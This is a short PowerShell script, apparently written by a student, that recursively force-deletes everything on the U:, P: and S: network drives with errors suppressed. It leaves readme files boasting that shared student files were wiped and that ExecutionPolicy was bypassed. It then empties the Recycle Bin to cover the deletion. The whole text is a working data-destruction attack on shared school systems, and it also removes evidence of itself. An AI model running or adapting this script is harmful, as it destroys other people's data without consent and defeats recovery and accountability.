cd U:\ 
Remove-Item * -Recurse -Force -ErrorAction silentlycontinue
cd P:\ 
Remove-Item * -Recurse -Force -ErrorAction silentlycontinue
cd S:\ 
Remove-Item * -Recurse -Force -ErrorAction silentlycontinue

cd U:\
$i = 1
while ($i -lt 10){
	New-Item .\readme$i.txt -Force
	$i++
}
Set-Content readme* "All the files that are accessible by all the students on the network (only the shared files were deleted, their student folders were not affected - well, except if you're the one using the computer) have been deleted.`nI bypassed ExecutionPolicy since it's not really that secure.`rI also deleted my script and emptied the Recycle Bin :)" -Force -ErrorAction silentlycontinue
Clear-RecycleBin -Force -ErrorAction silentlycontinue